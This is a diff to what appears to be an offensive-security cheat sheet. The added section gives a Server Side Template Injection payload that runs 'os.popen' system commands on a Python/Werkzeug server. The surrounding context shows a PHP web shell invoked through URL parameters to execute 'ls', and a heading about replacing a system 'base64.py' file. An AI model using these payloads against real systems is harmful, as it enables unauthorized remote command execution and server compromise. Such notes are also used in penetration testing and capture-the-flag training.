@@ -279,6 +279,12 @@ Usage :
   Ex :
     http://target.com/path/to/shell.php?_=system&__=ls
 ```
+# Server Side Template Injection (SSTI)
+```bash
+Werkzeug 1.0.1. python based server (python 3.6.8) 
+Python’s os module here. The popen method of os module can be used to run system commands on the server.
+code={os.popen("id").read()}
+```
 
 ##### Rplace /usr/lib/python3.8/base64.py
 ```
